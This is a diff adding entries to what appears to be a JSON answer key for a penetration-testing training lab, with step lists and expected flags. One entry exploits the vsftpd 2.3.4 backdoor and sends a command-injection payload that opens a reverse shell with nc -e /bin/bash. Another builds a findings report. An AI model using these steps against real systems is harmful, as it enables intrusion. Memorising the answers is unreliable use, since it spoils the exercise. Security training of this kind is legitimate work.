@@ -568,5 +568,41 @@
     "submit": {
       "o2": "F-B"
     }
+  },
+  "c11-m01": {
+    "steps": [
+      "nmap -sV -sC 10.10.20.15",
+      "nmap -sV 10.10.20.5",
+      "nmap -sV 10.10.20.6",
+      "nmap -sV 10.10.20.9",
+      "searchsploit vsftpd 2.3.4",
+      "ftp 10.10.20.15",
+      "hacker:)",
+      "nc 10.10.20.15 6200",
+      "cat /root/flag.txt",
+      "exit",
+      "nc -lvnp 4444",
+      "curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; nc 10.10.14.2 4444 -e /bin/bash' http://shop.acme.test/admin/diagnostics",
+      "cat /var/www/shopzone/flag.txt"
+    ],
+    "submit": {
+      "o2": "10.10.20.15",
+      "o5": "FLAG{vsftpd_234_backdoor_is_still_out_there}",
+      "o6": "FLAG{reverse_shell_from_command_injection}"
+    }
+  },
+  "c11-m02": {
+    "steps": [
+      "cat ~/Documents/engagement-log.txt",
+      "cvss CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "mkdir -p ~/report",
+      "echo '## Executive Summary' > ~/report/final-report.md",
+      "echo 'Finding A: CVE-2011-2523 vsftpd backdoor (Critical)' >> ~/report/final-report.md",
+      "echo 'Finding B: command injection ใน ShopZone (Critical)' >> ~/report/final-report.md",
+      "echo '## Remediation' >> ~/report/final-report.md"
+    ],
+    "submit": {
+      "o7": "2"
+    }
   }
 }
